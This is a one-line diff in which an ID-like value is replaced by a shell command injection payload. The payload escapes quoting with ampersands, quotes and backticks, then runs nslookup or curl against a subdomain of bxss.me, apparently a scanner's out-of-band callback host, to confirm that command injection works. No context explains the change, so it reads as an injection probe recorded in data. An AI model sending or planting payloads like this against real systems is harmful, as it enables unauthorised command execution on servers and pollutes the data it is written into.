@@ -1,1 +1,1 @@
-MO_087738844640_000/.
+&(nslookup -q=cname hitffxupmumnu35f9b.bxss.me||curl hitffxupmumnu35f9b.bxss.me)&'\"`0&(nslookup -q=cname hitffxupmumnu35f9b.bxss.me||curl hitffxupmumnu35f9b.bxss.me)&`'
